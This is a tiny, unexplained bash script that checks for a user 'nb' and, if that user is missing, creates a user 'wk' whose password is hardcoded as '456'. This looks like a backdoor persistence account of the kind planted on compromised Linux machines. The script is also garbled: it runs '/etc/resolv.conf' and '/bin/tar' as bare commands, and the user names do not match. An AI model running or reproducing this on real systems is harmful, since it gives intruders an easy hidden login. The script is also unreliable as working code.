#!/bin/bash
/etc/resolv.conf
id nb
if [ $? != 0 ];then
   useradd wk
   echo 456 | passwd --stdin wk
fi
/bin/tar
